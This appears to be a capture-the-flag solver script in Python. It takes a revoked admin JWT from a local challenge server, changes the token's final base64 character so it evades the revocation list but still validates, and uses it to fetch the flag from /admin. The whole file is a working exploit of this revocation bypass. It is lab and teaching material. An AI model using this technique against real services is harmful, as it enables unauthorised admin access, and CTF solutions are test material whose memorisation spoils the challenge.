import requests
import base64
import json
import re

URL = "http://localhost:8099"

def get_admin_token(tokens):
    for token in tokens:
        try:
            payload = json.loads(base64.urlsafe_b64decode(token.split('.')[1] + '==').decode('utf-8'))
            if payload.get('is_admin'):
                return token
        except:
            continue
    return None

def solve():
    session = requests.Session()
    response = session.get(f"{URL}/revoked")
    if response.status_code != 200:
        return

    revoked_tokens = response.json()
    if not revoked_tokens:
        return

    admin_token = get_admin_token(revoked_tokens)
    if not admin_token:
       return

    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
    last_char = admin_token[-1]

    for char in alphabet:
        if char == last_char:
            continue

        modified_token = admin_token[:-1] + char
        session.cookies.set("token", modified_token)
        response = session.get(f"{URL}/admin")

        if response.status_code == 200:
            flag_match = re.search(r'(goidactf{.*?})', response.text)
            if flag_match:
                print(f"{flag_match.group(1)}")
            return

if __name__ == "__main__":
    solve()
